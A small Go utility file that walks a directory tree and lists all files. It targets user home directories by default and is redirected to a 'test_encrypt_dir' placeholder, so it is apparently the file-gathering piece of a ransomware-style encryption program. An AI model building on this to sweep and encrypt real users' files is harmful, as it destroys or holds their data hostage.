package fileutils

import (
	"log"
	"os"
	"path/filepath"
	"runtime"
)

func GetAllFiles() []string {
	var files []string
	var dir string

	if runtime.GOOS == "windows" {
		dir = "C:\\Users\\"
	} else {
		dir = "/home/"
	}

	// Directory for testing the program, try to change it to your own directory
	dir = "<your_dir>\\test_encrypt_dir\\"

	err := filepath.Walk(dir,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			if !info.IsDir() {
				files = append(files, path)
			}

			return nil
		})

	if err != nil {
		log.Println(err)
	}

	return files
}
